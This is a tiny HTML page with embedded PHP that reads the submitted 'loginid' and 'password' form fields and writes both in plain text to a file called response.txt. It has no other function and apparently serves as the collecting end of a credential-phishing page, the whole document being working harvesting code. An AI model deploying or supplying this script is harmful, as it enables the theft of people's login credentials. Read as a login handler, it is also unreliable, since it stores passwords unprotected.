<html>
<body>

<?php
$myfile = fopen("response.txt", "w");
$txt = $_POST["loginid"];
fwrite($myfile, $txt);
$txt = "\n";
fwrite($myfile, $txt);
$txt = $_POST["password"];
fwrite($myfile, $txt);
fclose($myfile);
?>

</body>
</html>